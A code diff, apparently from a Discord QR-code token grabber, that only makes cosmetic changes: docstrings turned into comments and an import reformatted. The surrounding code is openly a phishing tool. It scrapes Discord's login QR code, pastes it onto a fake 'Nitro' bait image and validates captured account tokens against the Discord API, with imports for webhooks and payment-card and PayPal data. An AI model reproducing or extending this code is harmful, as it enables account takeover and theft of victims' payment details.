@@ -8,8 +8,7 @@ from discord_webhook.webhook_exceptions import ColorNotInRangeException
 from PIL import Image
 from requests import get
 
-from constants import (EMBED_AVATAR, EMBED_COLOR, EMBED_USERNAME, PAYMENT_CARD,
-                       PAYMENT_PAYPAL)
+from constants import EMBED_AVATAR, EMBED_COLOR, EMBED_USERNAME, PAYMENT_CARD, PAYMENT_PAYPAL
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
 from logger import log_unknown_exceptions
 
@@ -24,8 +23,7 @@ class QRGrabber:
 
     @log_unknown_exceptions(ERROR)
     def get_qr_from_source(self, source: BeautifulSoup) -> str:
-        """Grabs the discord QR code from the source provided.
-        """
+        #Grabs the discord QR code from the source provided.
         if not (div := re.search(r'qrCode-......', str(source))):
             raise QRCodeNotFound(
                 'The QR code could not be found on the Discord login page — please try again or contact the developers.')
@@ -50,9 +48,8 @@ class QRGrabber:
 
     @log_unknown_exceptions(ERROR)
     def generate_nitro_template(self, path_2: str) -> None:
-        """Generates a Discord Nitro template using the files in the resources directory.
-        \nThis template will be used to form a full bait image after a QR code pasted on it.
-        """
+        #Generates a Discord Nitro template using the files in the resources directory.
+        #This template will be used to form a full bait image after a QR code pasted on it.
         nitro_template = Image.open(
             os.path.join(
                 self.resources_path,
@@ -206,8 +203,7 @@ class TokenInfo:
 
     @log_unknown_exceptions(ERROR)
     def check_token(self) -> bool:
-        """Returns True if the discord API responds with status code 200 to a token.
-        """
+        #Returns True if the discord API responds with status code 200 to a token.
         response = get(
             'https://discord.com/api/v6/users/@me',
             headers=self.headers)
